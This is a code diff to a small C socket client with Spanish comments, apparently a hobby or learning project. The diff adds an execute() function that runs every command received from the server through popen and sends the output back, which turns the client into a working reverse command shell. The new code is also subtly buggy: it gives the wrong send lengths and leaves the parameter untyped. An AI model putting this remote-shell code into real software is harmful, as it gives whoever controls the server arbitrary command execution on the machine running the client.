@@ -1,10 +1,38 @@
 #include <stdio.h>
 #include <stdlib.h>
+#include <string.h>
 #include <sys/socket.h>
 #include <arpa/inet.h>
 
 #define PORT 7777
 #define SERVER_ADDR "127.0.0.1"
+
+int execute(socket){
+    char* mode_l = "Server status: listen";
+    char* mode_nl = "Server status: stop-listen";
+    while (1){
+        char buffer[1024] = {0};
+        FILE* fp;
+        read(socket, buffer, 1024);
+        if (!strcmp(buffer, "exit")) {
+            close(socket);
+            break;
+        }
+
+        fp = popen(buffer, "r");
+        if (fp == NULL) {
+            send(socket, "error\n", 8, 0);
+            continue;
+        }
+        send(socket, mode_l, strlen(mode_l), 0);
+
+        while (fgets(buffer, sizeof(buffer), fp)){
+            send(socket, buffer, sizeof(buffer), 0);
+        }
+
+        send(socket, mode_nl, strlen(mode_nl), 0);
+    }
+}
 
 int main(){
     int sock;
@@ -13,7 +41,7 @@ int main(){
 
     // Crear un socket
     if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1){
-        perror("Error creando el toyo e socket\n");
+        perror("Error creando el socket\n");
         exit(EXIT_FAILURE);
     }
 
@@ -33,6 +61,9 @@ int main(){
     // Leer mensaje del servidor
     read(sock, buffer, 1024);
     printf("%s\n", buffer);
+
+    // Default mode
+    execute(sock);
 
     return 0;
 }
